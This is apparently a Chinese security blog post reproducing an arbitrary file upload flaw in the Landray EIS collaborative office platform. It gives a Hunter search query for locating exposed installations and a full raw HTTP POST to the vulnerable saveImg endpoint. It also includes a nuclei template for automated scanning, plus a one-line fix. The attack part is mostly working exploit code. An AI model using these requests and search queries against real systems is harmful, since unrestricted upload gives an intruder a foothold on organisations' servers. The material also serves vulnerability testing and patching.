# 原创
：  【漏洞复现】蓝凌EIS智慧协同平台任意文件上传

# 【漏洞复现】蓝凌EIS智慧协同平台任意文件上传

**目录**

[蓝凌智慧协同平台介绍](#%E8%93%9D%E5%87%8C%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0%E4%BB%8B%E7%BB%8D)

[漏洞搜索](#%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2)

[漏洞点](#%E6%BC%8F%E6%B4%9E%E7%82%B9)

[漏洞复现](#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[nuclei poc](#nuclei%20poc)

[验证](#%E9%AA%8C%E8%AF%81)

[漏洞修复](#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D)

---


### 蓝凌智慧协同平台介绍

蓝凌智慧协同平台是个自动化办公OA，具有多端同步、无缝协作,提供移动端（蓝凌KK、阿里钉钉、微信企业号）、桌面端、网页端多端应用 统一入口、跨屏操作、信息同步知识云服务集成、学习与创新应用、企业2.0应用、跨系统整合等优点，并且在诸多公司也采用该平台。

### 漏洞搜索

web.title=”智慧协同平台”或者web.similar_icon==”14311050366792584935”（后面这个需要开会员）

### 漏洞点

在根目录下的eis/service/api.aspx文件中

### 漏洞复现

1.hunter搜索web.title=”智慧协同平台”，看到下述icon即为蓝凌智慧协同平台。

2.构造数据包。

```

POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Host: xxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Length: 185
Origin: xxxxxxxx
Connection: close
Cookie: ASP.NET_SessionId=dthhzbzqgnlhck454ctpxa55; Lang=zh-cn
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu

------WebKitFormBoundaryxdgaqmqu
Content-Disposition: form-data; name="file"filename="aaaaaaa.txt"
Content-Type: text/html

afhsahgsdaihguisabghs
------WebKitFormBoundaryxdgaqmqu--
```

3.将构造好的包发送，可以从响应包中获得文件上传地址。<br/>  

<br/> 4.访问该地址，可以看到上传的内容。

### nuclei poc

```
id: lanling-upload

info:
name: lanling-upload
author: xxxx
severity: info
description: description
reference:
- https://
tags: tags

requests:
- raw:
- |-
POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Lang=zh-cn; ASP.NET_SessionId=qaygc4nrdrf1flm3vzor04zz
Content-Length: 185
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu

------WebKitFormBoundaryxdgaqmqu
Content-Disposition: form-data; name="file"filename="aaaaaaa.txt"
Content-Type: text/html

afhsahgsdaihguisabghs
------WebKitFormBoundaryxdgaqmqu--

matchers-condition: and
matchers:
- type: word
part: body
words:
- txt
- type: status
status:
- 200
```

### 验证

### 漏洞修复

对用户上传的文件进行过滤，包括后缀和文件内容
